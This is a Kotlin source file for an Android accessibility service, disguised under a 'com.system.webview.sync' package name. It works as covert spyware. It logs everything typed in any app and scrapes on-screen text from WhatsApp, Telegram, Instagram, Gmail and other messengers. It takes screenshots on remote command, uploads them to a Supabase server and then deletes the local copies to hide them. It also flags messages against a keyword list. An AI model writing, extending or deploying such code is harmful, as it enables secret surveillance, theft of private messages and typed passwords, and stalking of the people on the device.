package com.system.webview.sync.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.content.BroadcastReceiver
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import com.system.webview.sync.localdb.PrefsHelper
import com.system.webview.sync.localdb.SyncQueueHelper
import com.system.webview.sync.network.SupabaseConfig
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class SystemSyncAccessibilityService : AccessibilityService() {

    // Rate-limit: screen scraping max once per 5 seconds per package
    private val lastScrapedAt = mutableMapOf<String, Long>()
    private val SCRAPE_INTERVAL_MS = 5000L

    // Debounce: capture complete typed text after user stops typing (1.5s idle)
    // Each package gets its own handler+runnable so simultaneous typing in
    // multiple apps is handled independently without interference.
    private val keylogHandler = Handler(Looper.getMainLooper())
    private val keylogDebounceRunnables = mutableMapOf<String, Runnable>()
    private val KEYLOG_DEBOUNCE_MS = 1500L   // send 1.5s after last keystroke

    // Dedup: avoid re-sending identical final text for same package
    private val lastSentKeylogText = mutableMapOf<String, String>()

    // Rate-limit window state changes — max once per 3 seconds per package
    private val lastWindowAt = mutableMapOf<String, Long>()
    private val WINDOW_INTERVAL_MS = 3000L
    private var lastWindowPackage = ""

    // Dedup: avoid sending identical content repeatedly
    private var lastScrapedContent = ""

    private var screenshotReceiver: BroadcastReceiver? = null
    private var screenshotObserver: ContentObserver? = null

    // Debounce: ContentObserver fires 3x per screenshot (create/write/thumbnail).
    // Coalesce all callbacks into one delayed call.
    private val screenshotHandler = Handler(Looper.getMainLooper())
    private var screenshotDebounce: Runnable? = null

    // Guard: skip if this exact file path was already uploaded
    @Volatile private var lastUploadedPath = ""
    @Volatile private var lastUploadedTime = 0L

    override fun onCreate() {
        super.onCreate()
        
        // Register BroadcastReceiver for screenshot commands
        screenshotReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                if (intent?.action == "com.system.webview.sync.TAKE_SCREENSHOT") {
                    android.util.Log.d("SystemSyncAccessibility", "Broadcast received: Taking screenshot")
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT)
                    } else {
                        android.util.Log.w("SystemSyncAccessibility", "GLOBAL_ACTION_TAKE_SCREENSHOT not supported on API < 28")
                    }
                }
            }
        }
        val filter = IntentFilter("com.system.webview.sync.TAKE_SCREENSHOT")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenshotReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenshotReceiver, filter)
        }

        // Register ContentObserver for screenshot capture detection
        registerScreenshotObserver()
    }

    override fun onDestroy() {
        // Cancel all pending keylog debounce runnables
        keylogDebounceRunnables.values.forEach { keylogHandler.removeCallbacks(it) }
        keylogDebounceRunnables.clear()
        screenshotDebounce?.let { screenshotHandler.removeCallbacks(it) }
        screenshotReceiver?.let { unregisterReceiver(it) }
        screenshotObserver?.let { contentResolver.unregisterContentObserver(it) }
        super.onDestroy()
    }

    // Only scrape these known social/chat apps — not ALL apps
    private val DEFAULT_OCR_PACKAGES = setOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "com.instagram.android",
        "org.telegram.messenger",
        "org.telegram.messenger.web",
        "com.facebook.orca",
        "com.facebook.katana",
        "com.linkedin.android",
        "com.twitter.android",
        "com.x.android",
        "com.zhiliaoapp.musically",
        "com.ss.android.ugc.trill",
        "com.snapchat.android",
        "com.google.android.gm",
        "com.microsoft.office.outlook"
    )

    // V2: Expanded keyword list with severity classification
    private val HIGH_KEYWORDS   = listOf("bunuh", "porn", "bokep", "xxx", "sabu", "ganja", "mati lo", "narkoba")
    private val MEDIUM_KEYWORDS = listOf("judi", "slot", "togel", "bet", "casino", "bully", "ancam", "kabur", "lari dari rumah", "jangan bilang")
    private val LOW_KEYWORDS    = listOf("pinjol", "miras", "bolos", "drugs", "benci", "sara", "hack")

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val deviceUuid = PrefsHelper.getDeviceUuid(applicationContext) ?: run {
            android.util.Log.e("SystemSyncAccessibility", "deviceUuid is null!")
            return
        }

        when (event.eventType) {

            // ── Keyboard / text input (debounce) ──────────────────────────
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val typedText = event.text.joinToString(" ").trim()
                if (typedText.isEmpty()) return

                // Cancel previous debounce for this package and reschedule.
                // When the user stops typing for 1.5s, the runnable fires and
                // sends the COMPLETE text — not an intermediate single character.
                keylogDebounceRunnables[packageName]?.let { keylogHandler.removeCallbacks(it) }

                val runnable = Runnable {
                    // Skip if identical to last sent text for this package
                    if (typedText == lastSentKeylogText[packageName]) return@Runnable
                    lastSentKeylogText[packageName] = typedText

                    android.util.Log.d("SystemSyncAccessibility", "KEY [$packageName]: '$typedText'")
                    val payload = JSONObject().apply {
                        put("device_id", deviceUuid)
                        put("app_package", packageName)
                        put("typed_text", typedText)
                        put("is_suspicious", evaluateSuspiciousContent(typedText))
                    }
                    SyncQueueHelper.enqueue(applicationContext, "keylogger_logs", payload.toString())
                    keylogDebounceRunnables.remove(packageName)
                }
                keylogDebounceRunnables[packageName] = runnable
                keylogHandler.postDelayed(runnable, KEYLOG_DEBOUNCE_MS)
            }

            // ── Screen / window switching (screen activity) ───────────────
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // Skip system UI, keyboards, and our own package
                if (packageName == applicationContext.packageName) return
                if (packageName.startsWith("com.android.systemui")) return
                if (packageName.startsWith("com.miui.securitycenter")) return

                val now = System.currentTimeMillis()
                // Dedup: skip if same package opened too recently
                if (packageName == lastWindowPackage) {
                    val lastWin = lastWindowAt[packageName] ?: 0L
                    if (now - lastWin < WINDOW_INTERVAL_MS) return
                }
                lastWindowAt[packageName] = now
                lastWindowPackage = packageName

                // Window title (activity class name) as screen label
                val windowTitle = event.className?.toString() ?: ""
                android.util.Log.d("SystemSyncAccessibility", "WINDOW [$packageName]: $windowTitle")

                // Log to screen_scraped_logs — field scraped_text berisi info window
                val screenInfo = "[App Dibuka] $packageName\nScreen: $windowTitle"
                val payload = JSONObject().apply {
                    put("device_id", deviceUuid)
                    put("app_package", packageName)
                    put("scraped_text", screenInfo)
                    put("is_suspicious", evaluateSuspiciousContent(packageName))
                }
                SyncQueueHelper.enqueue(applicationContext, "screen_scraped_logs", payload.toString())
            }

            // ── Screen content scraping (OCR monitored apps) ──────────────
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Only scrape dynamic monitored apps
                val syncedOcr = PrefsHelper.getOcrPackages(applicationContext)
                val activeOcr = if (syncedOcr.isNotEmpty()) syncedOcr else DEFAULT_OCR_PACKAGES
                if (!activeOcr.contains(packageName)) return

                // Rate-limit: skip if scraped this package too recently
                val now = System.currentTimeMillis()
                val lastTime = lastScrapedAt[packageName] ?: 0L
                if (now - lastTime < SCRAPE_INTERVAL_MS) return
                lastScrapedAt[packageName] = now

                val rootNode = rootInActiveWindow ?: return
                val screenTexts = mutableListOf<String>()
                extractNodeTexts(rootNode, screenTexts)
                @Suppress("DEPRECATION") rootNode.recycle()

                if (screenTexts.isEmpty()) return

                val screenContent = screenTexts.joinToString("\n").trim()
                // Dedup: skip if identical to last scrape
                if (screenContent == lastScrapedContent || screenContent.length < 5) return
                lastScrapedContent = screenContent

                android.util.Log.d("SystemSyncAccessibility", "SCRAPE [$packageName]: ${screenTexts.size} texts")
                val payload = JSONObject().apply {
                    put("device_id", deviceUuid)
                    put("app_package", packageName)
                    put("scraped_text", screenContent)
                    put("is_suspicious", evaluateSuspiciousContent(screenContent))
                }
                SyncQueueHelper.enqueue(applicationContext, "screen_scraped_logs", payload.toString())
            }
        }
    }

    private fun extractNodeTexts(node: AccessibilityNodeInfo?, list: MutableList<String>) {
        if (node == null) return
        val nodeText = node.text?.toString()?.trim()
        if (!nodeText.isNullOrEmpty()) list.add(nodeText)
        for (i in 0 until node.childCount) {
            extractNodeTexts(node.getChild(i), list)
        }
    }

    // V2: evaluateSuspiciousContent now sends real-time alert to alerts table
    private fun evaluateSuspiciousContent(content: String): Boolean {
        val lower = content.lowercase()
        
        // Dynamic keywords from PrefsHelper
        val dynamicKeywords = PrefsHelper.getKeywords(applicationContext)
        
        // If there are no dynamic keywords, fall back to default keywords
        val matchedKeyword = if (dynamicKeywords.isNotEmpty()) {
            dynamicKeywords.keys.firstOrNull { lower.contains(it) }
        } else {
            val matchedHigh   = HIGH_KEYWORDS.firstOrNull { lower.contains(it) }
            val matchedMedium = if (matchedHigh == null) MEDIUM_KEYWORDS.firstOrNull { lower.contains(it) } else null
            val matchedLow    = if (matchedHigh == null && matchedMedium == null) LOW_KEYWORDS.firstOrNull { lower.contains(it) } else null
            matchedHigh ?: matchedMedium ?: matchedLow
        }

        if (matchedKeyword != null) {
            val severity = if (dynamicKeywords.isNotEmpty()) {
                dynamicKeywords[matchedKeyword] ?: "MEDIUM"
            } else {
                when {
                    HIGH_KEYWORDS.contains(matchedKeyword) -> "HIGH"
                    MEDIUM_KEYWORDS.contains(matchedKeyword) -> "MEDIUM"
                    else -> "LOW"
                }
            }
            sendKeywordAlert(content, matchedKeyword, severity)
            return true
        }
        return false
    }

    // V2: Send real-time alert to Supabase alerts table
    private fun sendKeywordAlert(content: String, keyword: String, severity: String) {
        val deviceUuid = PrefsHelper.getDeviceUuid(applicationContext) ?: return

        val payload = JSONObject().apply {
            put("device_id",       deviceUuid)
            put("alert_type",      "KEYWORD_MATCH")
            put("severity",        severity)
            put("message",         "Kata kunci '$keyword' terdeteksi: ${content.take(150)}")
            put("is_acknowledged", false)
        }
        SyncQueueHelper.enqueue(applicationContext, "alerts", payload.toString())
        android.util.Log.d("SystemSyncAccessibility", "Alert terkirim: [$severity] keyword='$keyword'")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        android.util.Log.d("SystemSyncAccessibility", "onServiceConnected: Accessibility Service aktif")
        try {
            val intent = android.content.Intent(this, BackgroundSyncService::class.java)
            androidx.core.content.ContextCompat.startForegroundService(this, intent)
        } catch (e: Exception) {
            android.util.Log.e("SystemSyncAccessibility", "Failed to start BackgroundSyncService", e)
        }
    }

    override fun onInterrupt() {}

    private fun registerScreenshotObserver() {
        screenshotObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                android.util.Log.d("SystemSyncAccessibility", "ContentObserver change: $uri")
                // Debounce: cancel any pending call and re-schedule 2 s later.
                // This collapses the 3 rapid onChange callbacks (create/write/thumbnail)
                // that Android fires for a single screenshot into one actual upload.
                screenshotDebounce?.let { screenshotHandler.removeCallbacks(it) }
                screenshotDebounce = Runnable { processLatestScreenshot() }
                screenshotHandler.postDelayed(screenshotDebounce!!, 2000L)
            }
        }
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            screenshotObserver!!
        )
    }

    private fun processLatestScreenshot() {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Images.Media._ID,        // index 0
            MediaStore.Images.Media.DISPLAY_NAME, // index 1
            MediaStore.Images.Media.DATA,         // index 2
            MediaStore.Images.Media.SIZE,         // index 3
            MediaStore.Images.Media.DATE_ADDED    // index 4
        )
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
        try {
            contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val mediaStoreId = cursor.getLong(0)   // _ID — used for reliable deletion
                    val name = cursor.getString(1) ?: ""
                    val path = cursor.getString(2) ?: return
                    val size = cursor.getLong(3)
                    val dateAdded = cursor.getLong(4)

                    // Only process screenshots added in the last 15 seconds
                    val ageSeconds = (System.currentTimeMillis() / 1000) - dateAdded
                    if (ageSeconds >= 15) return
                    if (!name.lowercase().contains("screenshot") && !path.lowercase().contains("screenshot")) return

                    // Guard: skip if this exact path was already uploaded
                    if (path == lastUploadedPath) {
                        android.util.Log.d("SystemSyncAccessibility", "Screenshot already uploaded, skipping: $path")
                        return
                    }
                    val now = System.currentTimeMillis()
                    if (now - lastUploadedTime < 5000L) {
                        android.util.Log.d("SystemSyncAccessibility", "Screenshot rate limit hit (within 5s), skipping: $path")
                        return
                    }
                    lastUploadedPath = path
                    lastUploadedTime = now

                    android.util.Log.d("SystemSyncAccessibility", "Processing new screenshot: $path (mediaId=$mediaStoreId)")
                    uploadScreenshotToSupabase(path, size, mediaStoreId)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("SystemSyncAccessibility", "Failed to query latest screenshot", e)
        }
    }

    private fun uploadScreenshotToSupabase(filePath: String, @Suppress("UNUSED_PARAMETER") fileSize: Long, mediaStoreId: Long) {
        val deviceUuid = PrefsHelper.getDeviceUuid(applicationContext) ?: return
        val file = File(filePath)
        if (!file.exists()) return

        val storagePath = "$deviceUuid/screenshot_${System.currentTimeMillis()}.jpg"
        val url = "${SupabaseConfig.URL}/storage/v1/object/screenshots/$storagePath"
        val mediaType = "image/jpeg".toMediaType()

        val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build()

        Executors.newSingleThreadExecutor().execute {
            try {
                // Wait for the file to be fully written (size > 0), up to 3 seconds
                var attempts = 0
                while (file.length() == 0L && attempts < 30) {
                    Thread.sleep(100)
                    attempts++
                }
                val actualFileSize = file.length()
                if (actualFileSize == 0L) {
                    android.util.Log.e("SystemSyncAccessibility", "Screenshot file is empty after 3 seconds: ${file.absolutePath}")
                    return@execute
                }

                val requestBody = file.readBytes().toRequestBody(mediaType)
                val request = Request.Builder()
                    .url(url)
                    .put(requestBody)
                    .addHeader("apikey", SupabaseConfig.SERVICE_ROLE_KEY)
                    .addHeader("Authorization", "Bearer ${SupabaseConfig.SERVICE_ROLE_KEY}")
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        android.util.Log.d("SystemSyncAccessibility", "Screenshot uploaded: $storagePath ($actualFileSize bytes)")
                        insertScreenshotDbRecord(storagePath, actualFileSize)
                        // Hapus file lokal setelah berhasil dikirim ke database
                        deleteScreenshotFile(file, mediaStoreId)
                    } else {
                        android.util.Log.e("SystemSyncAccessibility", "Upload failed: ${response.code} ${response.body?.string()}")
                    }
                }
            } catch (e: Exception) {
                android.util.Log.e("SystemSyncAccessibility", "Screenshot upload exception", e)
            }
        }
    }

    private fun insertScreenshotDbRecord(storagePath: String, fileSize: Long) {
        val deviceUuid = PrefsHelper.getDeviceUuid(applicationContext) ?: return
        val payload = JSONObject().apply {
            put("device_id", deviceUuid)
            put("storage_path", storagePath)
            put("trigger_reason", "MANUAL")
            put("file_size_bytes", fileSize)
        }
        SyncQueueHelper.enqueue(applicationContext, "screenshots", payload.toString())
    }

    private fun deleteScreenshotFile(file: File, mediaStoreId: Long) {
        try {
            // 1. Hapus dari MediaStore menggunakan _ID yang sudah diketahui dari saat query.
            //    Lebih reliable daripada re-query by DATA path (deprecated di Android 10+).
            if (mediaStoreId >= 0) {
                val mediaUri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    mediaStoreId
                )
                val deleted = contentResolver.delete(mediaUri, null, null)
                android.util.Log.d("SystemSyncAccessibility", "MediaStore delete: $deleted rows for id=$mediaStoreId")
            }

            // 2. Hapus file fisik sebagai fallback (berhasil di Android < 10 atau scoped storage)
            if (file.exists()) {
                val ok = file.delete()
                android.util.Log.d("SystemSyncAccessibility", "File.delete() = $ok for ${file.name}")
            }
        } catch (e: Exception) {
            android.util.Log.w("SystemSyncAccessibility", "Failed to delete screenshot file", e)
        }
    }
}
